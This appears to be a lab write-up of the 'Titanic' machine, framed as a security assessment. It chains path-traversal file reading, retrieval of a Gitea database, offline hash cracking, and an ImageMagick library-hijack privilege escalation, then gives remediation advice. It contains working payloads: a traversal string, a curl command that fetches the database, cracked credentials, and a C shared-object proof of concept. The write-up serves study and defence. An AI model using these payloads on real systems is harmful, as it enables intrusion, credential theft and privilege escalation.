---
title: Titanic
slug: /Titanic-Vulnerability-Research
tags: [LFI, ImageMagick, Credential Exposure, Privilege Escalation, Vulnerability Research]
---

## Executive Summary

This assessment documents a chained compromise of a Linux-hosted web application environment. The path to full compromise involved three issues:

1. An unauthenticated local file inclusion in a ticket download endpoint.
2. Exposure of self-hosted Gitea application data, enabling offline credential recovery.
3. Privileged processing of attacker-controlled images through a vulnerable ImageMagick build.

Individually, each issue was material. In combination, they enabled end-to-end compromise from web access to privileged code execution.

## Initial Surface

Service enumeration identified SSH and HTTP:

```bash
❯ nmap -sC -sV target
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-14 21:59 +0545
Nmap scan report for target
Host is up (0.33s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Titanic - Book Your Ship Trip
| http-server-header:
|   Apache/2.4.52 (Ubuntu)
|_  Werkzeug/3.0.3 Python/3.10.12
```

The application exposed a booking workflow that ultimately redirected the client to a ticket download endpoint:

```text
/download?ticket=rand-id.json
```

That parameter became the entry point for file disclosure.

## Finding 1: Local File Inclusion in Ticket Download

Replacing the expected ticket filename with a traversal payload returned local files directly:

```text
../../../../etc/passwd
```

The response included system account data and confirmed arbitrary local file read through the download handler:

```text
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
developer:x:1000:1000:developer:/home/developer:/bin/bash
```

This issue allowed direct access to sensitive host files, application configuration, and internal environment details.

## Internal Discovery Through File Read

Reading `/etc/hosts` exposed an internal virtual host:

```text
127.0.0.1 localhost titanic.htb dev.titanic.htb
127.0.1.1 titanic
```

That host resolved to a Gitea instance. After reaching the development interface, repository review showed that the application stack stored Gitea data under the developer home directory, specifically:

```text
/home/developer/gitea/data/gitea/gitea.db
```

Because the file inclusion was unrestricted, the database could be retrieved directly:

```bash
❯ curl -s "http://target/download?ticket=/home/developer/gitea/data/gitea/gitea.db" -o gitea.db
```

## Finding 2: Gitea Data Exposure and Offline Credential Recovery

Inspecting the SQLite database revealed credential material for multiple Gitea users:

```bash
sqlite3 gitea.db
sqlite> SELECT lower_name, passwd, salt FROM user;
```

Example output:

```text
administrator|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|2d149e5fbd1b20cf31db3e3c6a28fc9b
developer|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|8bf3e3452b78544f8bee9400d6936d34
test|6f4dd1c617813da3dcc9ee0c7b0aeb7b3135cc85943e92a0e54102486cff31414ded2eaeac5312914a4f333ae1f2e2d43110|3f68d4b0d5183c5d6d811d55a367dd63
```

The stored format was converted into a cracking-compatible representation:

```bash
❯ sqlite3 gitea.db 'select salt,passwd from user;' | python3 gitea2hashcat.py
[+] Run the output hashes through hashcat mode 10900 (PBKDF2-HMAC-SHA256)

sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY=
sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
sha256:50000:P2jUsNUYPF1tgR1Vo2fdYw==:b03RxheBPaPcye4MewrrezE1zIWUPpKg5UECSGz/MUFN7S6urFMSkUpPMzrh8uLUMRA=
```

The developer credential was recoverable offline:

```text
developer:25282528
```

At that point, file read had escalated into valid system-level access through credential reuse.

## Post-Access Analysis

After access as the `developer` user, a locally installed script under `/opt/scripts` was of immediate interest:

```bash
developer@target:/opt/scripts$ cat identify_images.sh
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

This established an important security property:

- attacker-controlled files under `/opt/app/static/assets/images` were processed automatically
- processing occurred through `/usr/bin/magick identify`
- the job ran with higher privileges than the compromised application user

## Finding 3: Privileged ImageMagick Processing

The installed ImageMagick version was:

```bash
developer@target:/opt/scripts$ magick --version
Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.org
```

This build was exposed to a known code execution path affecting ImageMagick/AppImage deployments. In this environment, a shared-library hijack approach was sufficient because the privileged image-processing workflow operated inside an attacker-writable directory.

A minimal proof-of-concept shared object:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init() {
    system("id > /tmp/imagemagick_exec_check");
    exit(0);
}
```

Compiled in the image-processing directory:

```bash
gcc -x c -shared -fPIC -o ./libxcb.so.1 exploit.c
```

To trigger processing, a benign image change was enough:

```bash
cp home.jpg home2.jpg
```

When the privileged script processed the directory contents, ImageMagick loaded the attacker-controlled library and executed the constructor. That converted a writable image directory into a privileged code-execution surface.

## Impact

This chain enabled:

- arbitrary local file disclosure from the web tier
- extraction of application secrets and user credential material
- offline password recovery
- authenticated shell access as a local user
- privileged code execution through a vulnerable image-processing workflow

From a defensive perspective, the most important point is not any single bug in isolation. The severe impact came from how ordinary operational decisions combined:

- unvalidated path handling in a file download feature
- colocating sensitive application state on the same host
- password reuse or reuse-equivalent access between services
- privileged automation over attacker-influenced files

## Remediation

Recommended fixes:

1. Eliminate path traversal by resolving requested files against a fixed allowlisted directory and rejecting any path escape.
2. Remove direct filesystem access to application state from web-facing handlers.
3. Rotate exposed Gitea credentials and review reuse across SSH, internal apps, and automation.
4. Isolate development services from production-accessible paths and internal-only hostnames.
5. Run image-processing jobs in a constrained sandbox with a minimal environment and a non-privileged account.
6. Patch or replace vulnerable ImageMagick/AppImage components and review delegate/library loading behavior.
7. Treat attacker-writable media directories as untrusted execution boundaries, not passive storage.

## References

- [ImageMagick Advisory](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8)
